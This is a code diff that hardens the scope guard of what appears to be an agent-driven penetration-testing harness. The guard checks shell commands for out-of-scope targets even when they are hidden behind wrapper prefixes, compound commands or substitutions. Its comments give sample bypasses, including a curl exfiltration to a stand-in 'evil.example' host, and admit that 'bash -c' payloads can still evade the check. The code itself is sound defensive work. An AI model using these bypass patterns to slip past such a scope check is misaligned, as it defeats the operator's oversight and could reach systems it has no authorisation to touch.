@@ -104,17 +104,185 @@ function isTargetFacing(technique: string | undefined, toolName: string, binary:
   return false;
 }
 
+// Lowercased mirrors of the binary allowlists, for O(1) membership when we
+// classify a command by ANY of its shell-segment binaries (not just the first
+// token). Built once at module load.
+const TARGET_FACING_BINARIES_LC = new Set([...TARGET_FACING_BINARIES].map(b => b.toLowerCase()));
+const NETWORK_CAPABLE_BINARIES_LC = new Set([...NETWORK_CAPABLE_BINARIES].map(b => b.toLowerCase()));
+
+// Command wrappers that prefix a real command. The scope guard must look past
+// them (and past leading `VAR=val` assignments) so a wrapper prefix can't hide
+// the wrapped binary from classification:
+//   proxychains nmap 10/8   ·   sudo -u bob nmap …   ·   timeout 30 curl …
+const COMMAND_WRAPPERS = new Set([
+  'proxychains', 'proxychains4', 'sudo', 'doas', 'env', 'time', 'timeout',
+  'stdbuf', 'nice', 'ionice', 'setsid', 'nohup', 'unbuffer',
+]);
+
+const LEADING_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;
+
+/**
+ * Split a shell command into segments on UNQUOTED control operators
+ * (`;`, `|`, `&`, newline) and command/process-substitution boundaries
+ * (`$(`, backtick, `<(`, `>(`, `)`), so a binary invoked inside a substitution
+ * (`echo $(curl evil)`) surfaces as its own segment. Quote-aware: a separator
+ * inside a quote is not a boundary (`echo "a; b"` is one segment). An
+ * unterminated quote falls back to a quote-blind split so it can't hide a later
+ * binary.
+ */
+function splitShellSegments(command: string): string[] {
+  const segments: string[] = [];
+  let cur = '';
+  let quote: '"' | "'" | null = null;
+  const flush = () => { if (cur.trim()) segments.push(cur); cur = ''; };
+  for (let i = 0; i < command.length; i += 1) {
+    const c = command[i];
+    if (quote) {
+      cur += c;
+      if (c === quote) quote = null;
+      else if (c === '\\' && quote === '"' && i + 1 < command.length) { cur += command[i + 1]; i += 1; }
+      continue;
+    }
+    if (c === '"' || c === "'") { quote = c; cur += c; continue; }
+    if (c === '`') { flush(); continue; }
+    if (c === '$' && command[i + 1] === '(') { flush(); i += 1; continue; }
+    if ((c === '<' || c === '>') && command[i + 1] === '(') { flush(); i += 1; continue; }
+    if (c === ')' || c === ';' || c === '|' || c === '&' || c === '\n') { flush(); continue; }
+    cur += c;
+  }
+  flush();
+  if (quote !== null) {
+    for (const raw of command.split(/[;&|\n`)]+|\$\(|<\(|>\(/)) {
+      if (raw.trim()) segments.push(raw);
+    }
+  }
+  return segments;
+}
+
+/**
+ * True when any shell segment of `commandRepr` invokes a binary whose basename
+ * satisfies `pred`. Segments are split quote-aware (see splitShellSegments) so
+ * a benign leading token in a compound command (`echo x; curl evil`) can't hide
+ * a later target-facing/network-capable binary. Within a segment, leading
+ * `VAR=val` assignments are skipped; if the segment leads with a known wrapper
+ * (proxychains/sudo/env/timeout/…), EVERY subsequent token is checked (the
+ * wrapped command + its args); otherwise only the segment's leading binary is
+ * checked — so a plain `echo "…curl url…"` (echo leads, not a wrapper) is not
+ * misclassified.
+ */
+function commandInvokesBinary(commandRepr: string, pred: (base: string) => boolean): boolean {
+  if (!commandRepr) return false;
+  for (const seg of splitShellSegments(commandRepr)) {
+    const tokens = tokenizeCommandLike(seg.trim());
+    let i = 0;
+    while (i < tokens.length && LEADING_ASSIGNMENT_RE.test(tokens[i])) i += 1;
+    if (i >= tokens.length) continue;
+    const lead = basename(tokens[i]).toLowerCase();
+    if (COMMAND_WRAPPERS.has(lead)) {
+      for (let j = i + 1; j < tokens.length; j += 1) {
+        if (pred(basename(tokens[j]).toLowerCase())) return true;
+      }
+    } else if (pred(lead)) {
+      return true;
+    }
+  }
+  return false;
+}
+
+// Flag values that are NEVER an egress target and are dropped UNCONDITIONALLY
+// (even when the value looks like a URL/IP): exclusions, input/output files, and
+// curl/wget request metadata (header/referer/agent/cookie/body). Long forms are
+// global; short forms that are unambiguous only for a specific binary are keyed
+// per binary. A referer/header URL is a non-target, so `curl -e https://ref`
+// does not scope-block — while a boolean flag is NOT here, so it can't swallow
+// a target.
+// GLOBAL drops are LONG-form only: unambiguous across binaries and never a
+// boolean flag, so applying them to every binary can't swallow a host. All
+// SHORT drop flags are keyed per binary (a short flag that is value-taking on
+// one tool is boolean on another — a global short drop would swallow the target,
+// the fail-open class this split closes).
+const DROP_VALUE_GLOBAL = new Set([
+  '--exclude', '--excludefile', '--output', '--write-out',
+  '--header', '--referer', '--referrer', '--user-agent', '--cookie', '--cookie-jar',
+  '--data', '--data-raw', '--data-binary', '--data-urlencode', '--form', '--post-data',
+  '--script', '--script-args', '--script-args-file',
+]);
+const DROP_VALUE_BY_BIN: Record<string, Set<string>> = {
+  curl: new Set(['-H', '-e', '-A', '-b', '-d', '-F', '-o', '-w']),
+  wget: new Set(['-U', '-o', '-O']),
+  nmap: new Set(['-oA', '-oN', '-oX', '-oG', '-oS', '-iL', '-iR', '-D', '-g', '-S', '--data', '--data-string']),
+  masscan: new Set(['-oL', '-oJ', '-oX', '-oG', '--rate']),
+};
+
+// Flags that TAKE a value which is a non-target string (ssh identity/config/
+// login/port, nc port/source) but whose SHORT form is not globally unambiguous.
+// Their value is skipped ONLY when it does not look like a target, so a
+// mis-listed boolean flag can never SWALLOW a real target (fail-open); at worst
+// it skips a genuine non-target token.
+const MAYBE_VALUE_BY_BIN: Record<string, Set<string>> = {
+  ssh: new Set(['-i', '-F', '-o', '-l', '-p', '-c', '-m', '-b', '-E', '-I', '-Q', '-B', '-e', '-w']),
+  scp: new Set(['-i', '-F', '-o', '-l', '-P', '-c', '-S']),
+  sftp: new Set(['-i', '-F', '-o', '-l', '-P', '-c', '-S', '-b']),
+  rsync: new Set(['-e', '-T']),
+  nc: new Set(['-p', '-s', '-w', '-X', '-I', '-q', '-T', '-O', '-e']),
+  ncat: new Set(['-p', '-s', '-w', '-e', '-c', '-o', '-g', '-G', '-m', '-T']),
+  curl: new Set(['-u']),
+  nmap: new Set(['-p']),
+};
+
+function maybeValue(flag: string, bin: string): boolean {
+  return MAYBE_VALUE_BY_BIN[bin]?.has(flag) ?? false;
+}
+function dropsValue(flag: string, bin: string): boolean {
+  // MAYBE wins over DROP: a flag listed for this binary as a maybe-value keeps
+  // its looksLikeTarget safety net (never unconditionally swallows a target).
+  if (maybeValue(flag, bin)) return false;
+  return DROP_VALUE_GLOBAL.has(flag) || (DROP_VALUE_BY_BIN[bin]?.has(flag) ?? false);
+}
+
+/** True when a token looks like a concrete egress target (IP, CIDR, or URL). A
+ *  MAYBE-value flag never skips a target-looking value — so a value-flag can't
+ *  hide the real target that follows it (fail-open guard). Uses String.match
+ *  (stateless) to avoid /g lastIndex pitfalls. */
+function looksLikeTarget(token: string): boolean {
+  return token.match(IPV4) !== null || token.match(IPV6) !== null || token.match(URL_RE) !== null;
+}
+
+// Simple "host-first" binaries whose first positional operand is unambiguously a
+// host/URL, so an operand we cannot parse into a scope-checkable target must
+// fail closed. Deliberately EXCLUDES scanners (targets are dotted IPs/CIDRs the
+// regexes catch, and their rich flag grammar makes bare-operand detection
+// unreliable) and subcommand tools (openssl/mysql/psql — positionals are
+// subcommands, not hosts).
+const HOST_FIRST_BINARIES = new Set([
+  'ssh', 'scp', 'sftp', 'rsync', 'nc', 'ncat', 'netcat', 'telnet', 'ftp',
+]);
+
 const IPV4 = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\/\d{1,2})?\b/g;
-// Bracketed IPv6 (with optional :port) or bare IPv6 with at least two colons.
+// Bracketed IPv6 (optional :port) or bare IPv6 with ≥2 colon groups. Collapsed
+// forms (fe80::1, ::1) are matched by isWholeTokenIpv6 as a WHOLE token instead,
+// so a `::` substring inside code/URLs (std::cout, http://…/a::b) isn't
+// mis-extracted as a spurious target.
 const IPV6 = /\[([0-9a-fA-F:]+)\](?::\d+)?|\b(?:[0-9a-fA-F]{1,4}:){2,}[0-9a-fA-F:]*\b/g;
 const URL_RE = /\b(?:https?|ftp|smb|ssh|ldaps?|rdp):\/\/[^\s'"`]+/gi;
 const HOSTNAME = /\b(?=[a-zA-Z0-9.-]{1,253}\b)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b/g;
+// Tokens that look like a host but are really a file the tool reads/writes — a
+// deliberately broad list (scripts, crypto material, archives, captures, …) so
+// `openssl … key.pem`, `nmap --script http-enum.nse`, `-o out.html` are not
+// mistaken for targets.
+const FILE_LIKE_RE = /\.(?:py|sh|bash|zsh|conf|cfg|ini|rc|json|xml|txt|log|ya?ml|html?|js|ts|md|out|csv|pem|key|crt|cer|der|pfx|p12|pub|nse|php|aspx?|jsp|pcap|cap|zip|gz|tgz|tar|bz2|xz|bin|db|sqlite3?|pdf|xlsx?|docx?|png|jpe?g|gif)$/i;
+// A single bare DNS label (dc01), optionally user@label — a plausible internal
+// host that carries no dot/scheme, so the regexes above can't confirm it.
+const BARE_LABEL_RE = /^(?:[^@\s]+@)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,62})$/;
 
 interface ImplicitTargets {
   ips: string[];
   cidrs: string[];
   urls: string[];
   hostnames: string[];
+  /** A positional operand on a host-first binary that matched no target form
+   *  (bare label / ::-collapsed IPv6 / numeric-encoded IP) — caller fails closed. */
+  unresolvedHostOperand: boolean;
 }
 
 function tokenizeCommandLike(command: string): string[] {
@@ -127,74 +295,145 @@ function tokenizeCommandLike(command: string): string[] {
   return tokens;
 }
 
-function isNmapLike(toolName: string): boolean {
-  const name = basename(toolName).toLowerCase();
-  return name === 'nmap' || name === 'rustscan' || name === 'masscan';
+/** Scan one token for any target form, adding matches to `acc`. Returns true if
+ *  the token matched an IP / CIDR / URL / dotted-hostname (a file-looking host
+ *  is ignored). Bare labels, ::-collapsed IPv6 and numeric-encoded IPs do NOT
+ *  match here — the caller decides whether such an unresolved operand fails
+ *  closed. */
+/** True when the ENTIRE token is an IPv6 address (bracketed or bare, incl.
+ *  ::-collapsed forms). Anchored to the whole token so a `::` substring inside a
+ *  URL path or C++ scope operator is never treated as a spurious target. */
+function isWholeTokenIpv6(token: string): boolean {
+  const t = token.replace(/^\[/, '').replace(/\](?::\d+)?$/, '');
+  if (!/^[0-9a-fA-F:]+$/.test(t)) return false;
+  return t.includes('::') || (t.match(/:/g)?.length ?? 0) >= 2;
 }
 
-function scanArgsForTargets(toolName: string, args: string[], commandRepr: string): string[] {
-  if (!isNmapLike(toolName)) {
-    const stringsToScan = args.filter(a => typeof a === 'string' && a.length > 0 && !a.startsWith('-'));
-    if (commandRepr) stringsToScan.push(commandRepr);
-    return stringsToScan;
-  }
-
-  const sourceArgs = args.length === 2 && args[0] === '-c'
-    ? tokenizeCommandLike(commandRepr).slice(1)
-    : args;
-  const skipValueOptions = new Set([
-    '-oA', '-oG', '-oN', '-oS', '-oX', '-iL', '-iR',
-    '--exclude', '--excludefile',
-  ]);
-  const stringsToScan: string[] = [];
-  for (let i = 0; i < sourceArgs.length; i += 1) {
-    const token = sourceArgs[i];
-    if (!token) continue;
-    if (skipValueOptions.has(token)) {
-      i += 1;
-      continue;
-    }
-    if (token.startsWith('--exclude=') || token.startsWith('--excludefile=')) continue;
-    if (token.startsWith('-')) continue;
-    stringsToScan.push(token);
-  }
-  return stringsToScan;
+/** Normalize a decimal-encoded IPv4 (e.g. `3232235521` == 192.168.0.1) to dotted
+ *  form so it can be scope-checked. A known scope/SSRF evasion. Only a full
+ *  32-bit value (> 65535, so ports/counts are unaffected) is treated this way. */
+function decimalToDottedIp(token: string): string | null {
+  if (!/^\d+$/.test(token)) return null;
+  const n = Number(token);
+  if (!Number.isInteger(n) || n <= 65535 || n > 4294967295) return null;
+  return `${(n >>> 24) & 255}.${(n >>> 16) & 255}.${(n >>> 8) & 255}.${n & 255}`;
 }
 
-function extractImplicitTargets(toolName: string, args: string[], commandRepr: string): ImplicitTargets {
-  const ips = new Set<string>();
-  const cidrs = new Set<string>();
-  const urls = new Set<string>();
-  const hostnames = new Set<string>();
-
-  const stringsToScan = scanArgsForTargets(toolName, args, commandRepr);
-
-  for (const s of stringsToScan) {
-    for (const m of s.matchAll(IPV4)) {
-      const value = m[0];
-      if (value.includes('/')) cidrs.add(value);
-      else ips.add(value);
-    }
-    for (const m of s.matchAll(IPV6)) ips.add(m[1] ?? m[0]);
-    for (const m of s.matchAll(URL_RE)) urls.add(m[0]);
-  }
-  // Hostname pass — exclude tokens that already matched as a URL host or
-  // are obviously a binary path / file extension noise.
-  for (const s of stringsToScan) {
-    for (const m of s.matchAll(HOSTNAME)) {
+function scanTokenForTargets(
+  token: string,
+  acc: { ips: Set<string>; cidrs: Set<string>; urls: Set<string>; hostnames: Set<string> },
+): boolean {
+  let matched = false;
+  for (const m of token.matchAll(IPV4)) { matched = true; const v = m[0]; if (v.includes('/')) acc.cidrs.add(v); else acc.ips.add(v); }
+  for (const m of token.matchAll(IPV6)) { matched = true; acc.ips.add(m[1] ?? m[0]); }
+  for (const m of token.matchAll(URL_RE)) { matched = true; acc.urls.add(m[0]); }
+  if (!matched) {
+    for (const m of token.matchAll(HOSTNAME)) {
       const host = m[0];
-      if (host.startsWith('.') || host.endsWith('.')) continue;
-      // Skip host-looking strings that are actually file basenames.
-      if (/\.(?:py|sh|conf|json|xml|txt|log|yaml|yml|html|js|ts|md|out|csv)$/i.test(host)) continue;
-      // Skip if it overlaps with an already-extracted URL.
-      let inUrl = false;
-      for (const u of urls) { if (u.includes(host)) { inUrl = true; break; } }
-      if (inUrl) continue;
-      hostnames.add(host);
+      if (host.startsWith('.') || host.endsWith('.') || FILE_LIKE_RE.test(host)) continue;
+      matched = true;
+      acc.hostnames.add(host);
     }
   }
+  if (!matched && isWholeTokenIpv6(token)) {
+    matched = true;
+    acc.ips.add(token.replace(/^\[/, '').replace(/\](?::\d+)?$/, ''));
+  }
+  if (!matched) {
+    const dotted = decimalToDottedIp(token);
+    if (dotted) { matched = true; acc.ips.add(dotted); }
+  }
+  return matched;
+}
 
-  return { ips: [...ips], cidrs: [...cidrs], urls: [...urls], hostnames: [...hostnames] };
+/**
+ * Per-segment implicit-target extraction. For each shell segment (split
+ * quote-aware, incl. command-substitution boundaries), find the command binary
+ * (the first classified token — wrappers + their args sit before it) and
+ * scope-check the POSITIONAL operands after it: skip flags and the VALUES of
+ * non-target value-flags (headers/referer/output/script/ssh-identity/…). A
+ * positional operand on a simple host-first binary (ssh/nc/telnet/…) that
+ * matches no target form but looks like a bare host (single DNS label,
+ * user@host, ::-collapsed IPv6, or a numeric-encoded IP) sets
+ * `unresolvedHostOperand`, so the caller fails closed. Value-flag skipping is
+ * what lets every positional target be scope-checked (even alongside an
+ * explicit one) without false-blocking on incidental option values.
+ *
+ * `forceAllSegments` (set when the caller's technique is target-facing) analyses
+ * segments whose leading binary is unrecognised too (e.g. `echo 9.9.9.9`).
+ *
+ * Accepted static-analysis limits (the primary control is scope-checking
+ * declared targets + the MCP/engine egress boundary): a binary nested inside a
+ * `bash -c "…"` payload and exotic per-tool flag arities can still evade this.
+ */
+function extractImplicitTargets(commandRepr: string, forceAllSegments = false): ImplicitTargets {
+  const acc = { ips: new Set<string>(), cidrs: new Set<string>(), urls: new Set<string>(), hostnames: new Set<string>() };
+  let unresolvedHostOperand = false;
+  for (const seg of splitShellSegments(commandRepr)) {
+    const tokens = tokenizeCommandLike(seg.trim());
+    // Locate the command binary: the first classified token (past leading
+    // assignments); wrappers + their args sit before it.
+    let binIdx = -1;
+    for (let k = 0; k < tokens.length; k += 1) {
+      if (LEADING_ASSIGNMENT_RE.test(tokens[k])) continue;
+      const b = basename(tokens[k]).toLowerCase();
+      if (TARGET_FACING_BINARIES_LC.has(b) || NETWORK_CAPABLE_BINARIES_LC.has(b)) { binIdx = k; break; }
+    }
+    let hostFirst = false;
+    let bin = '';
+    let start: number;
+    if (binIdx >= 0) {
+      bin = basename(tokens[binIdx]).toLowerCase();
+      hostFirst = HOST_FIRST_BINARIES.has(bin);
+      start = binIdx + 1;
+    } else if (forceAllSegments) {
+      let k = 0;
+      while (k < tokens.length && (LEADING_ASSIGNMENT_RE.test(tokens[k]) || COMMAND_WRAPPERS.has(basename(tokens[k]).toLowerCase()))) k += 1;
+      start = k + 1; // skip the leading (unrecognised) command token
+    } else {
+      continue; // no classified binary in this segment
+    }
+    let firstPositionalSeen = false;
+    for (let j = start; j < tokens.length; j += 1) {
+      const t = tokens[j];
+      if (!t) continue;
+      if (t.startsWith('-')) {
+        const eq = t.indexOf('=');
+        if (eq > 0) {
+          const flag = t.slice(0, eq);
+          const val = t.slice(eq + 1);
+          if (dropsValue(flag, bin)) { /* drop unconditionally */ }
+          else if (maybeValue(flag, bin) && !looksLikeTarget(val)) { /* drop non-target value */ }
+          else scanTokenForTargets(val, acc);
+        } else {
+          const nxt = tokens[j + 1];
+          if (dropsValue(t, bin)) {
+            if (nxt !== undefined) j += 1; // drop the value unconditionally
+          } else if (maybeValue(t, bin) && nxt !== undefined && !looksLikeTarget(nxt)) {
+            j += 1; // skip a non-target value; a target-looking value is left to be scanned
+          }
+          // else: boolean flag (or target-looking value) — do not consume the next token
+        }
+        continue;
+      }
+      if (/^\d+$/.test(t) && Number(t) <= 65535 && firstPositionalSeen) continue; // trailing port/count
+      const matched = scanTokenForTargets(t, acc);
+      const wasFirst = !firstPositionalSeen;
+      firstPositionalSeen = true;
+      // Only the FIRST positional of a host-first binary is the host; later
+      // positionals are remote commands / ports / paths, not targets. A bare
+      // label, a ::-collapsed IPv6, or a numeric > 65535 (a numeric-encoded IP;
+      // ≤ 65535 is treated as a port) that we couldn't resolve fails closed.
+      const numeric = /^\d+$/.test(t);
+      if (
+        wasFirst && !matched && hostFirst && !FILE_LIKE_RE.test(t)
+        && ((BARE_LABEL_RE.test(t) && !numeric) || t.includes(':') || (numeric && Number(t) > 65535))
+      ) {
+        unresolvedHostOperand = true;
+      }
+    }
+  }
+  return { ips: [...acc.ips], cidrs: [...acc.cidrs], urls: [...acc.urls], hostnames: [...acc.hostnames], unresolvedHostOperand };
 }
 
 
@@ -656,6 +895,14 @@ export async function runInstrumentedProcess(
     const values = [...observedTargetCidrs];
     return values.length > 0 ? values : undefined;
   };
+  // Mirror of observedTargetCidrs for IPs/hostnames: implicitly-sniffed hosts
+  // are folded in here so the action_validated/action_failed events report the
+  // target that actually drove a scope decision (not just the declared ones).
+  const observedTargetIps = new Set(allTargetIps);
+  const targetIpsForEvents = (): string[] | undefined => {
+    const values = [...observedTargetIps];
+    return values.length > 0 ? values : undefined;
+  };
   const frontierType = frontier_item_id ? engine.getFrontierItem(frontier_item_id)?.type : undefined;
 
   // ---- 1. Validation ----
@@ -673,55 +920,69 @@ export async function runInstrumentedProcess(
     if (target_url) validationTargets.push({ target_url, technique, allow_unverified_scope });
     if (cloud_resource) validationTargets.push({ cloud_resource, technique, allow_unverified_scope });
 
-    // F3: if the caller declared no targets but the action is target-facing
-    // (recon/scan/web/etc., recognized by either technique or binary name),
-    // fall back to extracting implicit targets from argv + command. Without
-    // this a `nmap 8.8.8.8` invocation that never populated target_ip — and
-    // omitted technique entirely — would slip through scope. We fail closed
-    // when implicit targets are found and `allow_unverified_scope` is not set.
-    if (validationTargets.length === 0 && !operator_infra && isTargetFacing(technique, tool_name, binary)) {
-      const implicit = extractImplicitTargets(tool_name, args, command_repr);
+    // Scope guard: sniff implicit targets from the FULL command whenever the
+    // action is target-facing OR invokes a network-capable binary — detected
+    // across every shell segment and behind any wrapper prefix (see
+    // commandInvokesBinary), not just from the first command token. Discovered
+    // targets are merged into the validation set so the per-target
+    // validateAction loop below scope-checks each and fails closed on anything
+    // out of scope. This closes three bypasses:
+    //   - wrapper prefix:      proxychains|sudo|env|timeout … nmap 10/8
+    //   - compound command:    echo ok; curl https://evil.example/exfil
+    //   - suppression by one:  passing one in-scope target used to skip the
+    //                          sniff, letting OTHER embedded hosts ride along.
+    // Shell-only binaries that merely mention a URL/IP (echo, cat, …) are not
+    // classified as target-facing/network-capable, so benign log lines run.
+    const techniqueFacing = isTargetFacing(technique, '', '');
+    const targetFacing = techniqueFacing
+      || isTargetFacing('', tool_name, binary)
+      || commandInvokesBinary(command_repr, b => TARGET_FACING_BINARIES_LC.has(b));
+    const networkCapable = isNetworkCapableBinary(tool_name, binary)
+      || commandInvokesBinary(command_repr, b => NETWORK_CAPABLE_BINARIES_LC.has(b));
+
+    if (!operator_infra && (targetFacing || networkCapable)) {
+      // Value-flag-aware, per-segment extraction: only POSITIONAL operands are
+      // scope-checked, so incidental option values (-H headers, -e referer,
+      // --script files, -o output) never false-block — which lets us merge
+      // EVERY discovered target (IP/CIDR/URL/host), even alongside an explicit
+      // one, so an embedded out-of-scope host [H-11] and a later
+      // compound-command egress are both caught.
+      const implicit = extractImplicitTargets(command_repr, techniqueFacing);
+      const seenIps = new Set(allTargetIps);
+      const seenUrls = new Set(target_url ? [target_url] : []);
       for (const ip of implicit.ips) {
+        if (seenIps.has(ip)) continue;
+        seenIps.add(ip);
+        observedTargetIps.add(ip);
         validationTargets.push({ target_ip: ip, technique, allow_unverified_scope });
       }
       for (const cidr of implicit.cidrs) {
+        if (observedTargetCidrs.has(cidr)) continue;
         observedTargetCidrs.add(cidr);
         validationTargets.push({ target_cidr: cidr, technique, allow_unverified_scope });
       }
       for (const u of implicit.urls) {
+        if (seenUrls.has(u)) continue;
+        seenUrls.add(u);
         validationTargets.push({ target_url: u, technique, allow_unverified_scope });
       }
       for (const h of implicit.hostnames) {
+        if (seenIps.has(h)) continue;
+        seenIps.add(h);
+        observedTargetIps.add(h);
         // Hostnames go through target_ip (validateAction resolves both forms).
         validationTargets.push({ target_ip: h, technique, allow_unverified_scope });
       }
-    }
 
-    // Phase D: argv-token guard. If we still have no validation targets and
-    // the binary is network-capable (curl/ssh/nc/...) AND argv (or the raw
-    // command) contains a URL/IP/hostname, the caller is running a target-
-    // touching command under a non-target-facing technique label. Fail
-    // closed unless `allow_unverified_scope` is set.
-    //
-    // We deliberately limit this to the NETWORK_CAPABLE_BINARIES allowlist:
-    // a benign `echo connecting-to-https://example.com/...` log line must
-    // still run, so the guard skips for shell-only / non-network binaries.
-    //
-    // The pattern this closes:
-    //   run_bash({ command: 'curl https://target/admin', technique: 'note' })
-    // where `note` is not in TARGET_FACING_TECHNIQUES so the F3 path above
-    // didn't run, but the argv clearly references an external target.
-    if (
-      validationTargets.length === 0
-      && !allow_unverified_scope
-      && !operator_infra
-      && isNetworkCapableBinary(tool_name, binary)
-    ) {
-      const sniff = extractImplicitTargets(tool_name, args, command_repr);
-      const found = [...sniff.ips, ...sniff.cidrs, ...sniff.urls, ...sniff.hostnames];
-      if (found.length > 0) {
+      // Fail closed on a positional host operand we could NOT resolve to a
+      // scope-checkable target (a bare single-label host `ssh dc01`, a
+      // ::-collapsed IPv6, a numeric-encoded IP, or an `-iL` target file) on a
+      // simple host-first binary (ssh/nc/telnet/…). Independent of whether OTHER
+      // targets resolved — an unresolvable jump/host alongside an in-scope
+      // target still fails closed — but skipped under allow_unverified_scope.
+      if (implicit.unresolvedHostOperand && !allow_unverified_scope) {
         engine.logActionEvent({
-          description: `Refused: target tokens in argv with no scope metadata`,
+          description: 'Refused: unresolved host operand with no scope metadata',
           agent_id,
           action_id: normalizedActionId,
           event_type: 'action_failed',
@@ -731,9 +992,8 @@ export async function runInstrumentedProcess(
           frontier_item_id,
           result_classification: 'failure',
           details: {
-            reason: 'target_tokens_in_argv_without_scope',
-            argv_tokens_found: found.slice(0, 8),
-            hint: 'Pass target_url/target_ip explicitly, or set allow_unverified_scope=true if the tokens are intentional non-target references.',
+            reason: 'unresolved_target_without_scope',
+            hint: 'Pass target_ip/target_url/target_node explicitly, or set allow_unverified_scope=true if the operand is not an engagement target.',
           },
         });
         engine.persist();
@@ -745,9 +1005,8 @@ export async function runInstrumentedProcess(
               executed: false,
               validation_result: 'invalid',
               errors: [
-                'target_tokens_in_argv_without_scope: pass target_url/target_ip explicitly, or set allow_unverified_scope=true if intentional.',
+                'unresolved_target_without_scope: a network command references a host that could not be scope-checked (bare hostname, collapsed IPv6, or numeric IP). Pass target_ip/target_url/target_node explicitly, or set allow_unverified_scope=true if it is not a target.',
               ],
-              argv_tokens_found: found.slice(0, 8),
             }, null, 2),
           }],
           isError: true,
@@ -838,7 +1097,7 @@ export async function runInstrumentedProcess(
       tool_name,
       technique,
       target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
-      target_ips: allTargetIps.length > 0 ? allTargetIps : undefined,
+      target_ips: targetIpsForEvents(),
       target_cidrs: targetCidrsForEvents(),
       frontier_item_id,
       validation_result: validationResult,
@@ -858,7 +1117,7 @@ export async function runInstrumentedProcess(
         tool_name,
         technique,
         target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
-        target_ips: allTargetIps.length > 0 ? allTargetIps : undefined,
+        target_ips: targetIpsForEvents(),
         target_cidrs: targetCidrsForEvents(),
         frontier_item_id,
         result_classification: 'failure',
@@ -972,7 +1231,7 @@ export async function runInstrumentedProcess(
     technique,
     command_repr,
     target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
-    target_ips: allTargetIps.length > 0 ? allTargetIps : undefined,
+    target_ips: targetIpsForEvents(),
     target_cidrs: targetCidrsForEvents(),
     frontier_item_id,
     noise_estimate: noiseEstimate,
@@ -1094,7 +1353,7 @@ export async function runInstrumentedProcess(
     technique,
     command_repr,
     target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
-    target_ips: allTargetIps.length > 0 ? allTargetIps : undefined,
+    target_ips: targetIpsForEvents(),
     target_cidrs: targetCidrsForEvents(),
     frontier_item_id,
     result_classification: succeeded ? 'success' : 'failure',
